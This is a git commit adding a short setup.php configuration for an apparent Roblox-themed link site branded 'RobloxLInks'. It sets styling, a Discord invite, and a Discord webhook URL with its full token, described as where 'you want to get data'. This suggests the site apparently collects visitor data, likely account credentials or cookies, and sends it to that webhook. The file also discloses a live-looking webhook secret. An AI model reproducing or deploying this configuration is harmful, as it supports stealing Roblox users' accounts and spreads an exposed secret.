b00c6a5f7914b3592ce09ac916c3fa1d34382598
Truediary <arizonabakai@gmail.com>
2025-03-24 14:10:26 +0200

    Add files via upload

---
+++ setup.php
@@ -0,0 +1,7 @@
+<?php
+$color = '#242d75'; //hex color you want
+$image = 'https://c4.wallpaperflare.com/wallpaper/88/769/281/1920x1080-px-digital-art-japan-minimalism-simple-background-sun-trees-video-games-star-wars-hd-art-wallpaper-preview.jpg'; //image (must be url)
+$name = 'RobloxLInks'; //name of your brand
+$discord = 'discord.gg/robloxlinks'; //discord to your server
+$admin = 'https://discord.com/api/webhooks/1353392620478398593/Rhe5wfyOdTMUhPs4nE_0L6R93ZjOpkw7IAA4_vdo6_nfB3n-6AwLa-aQNtOPp3ruXAPM'; //your webhook where you want to get data
+?>
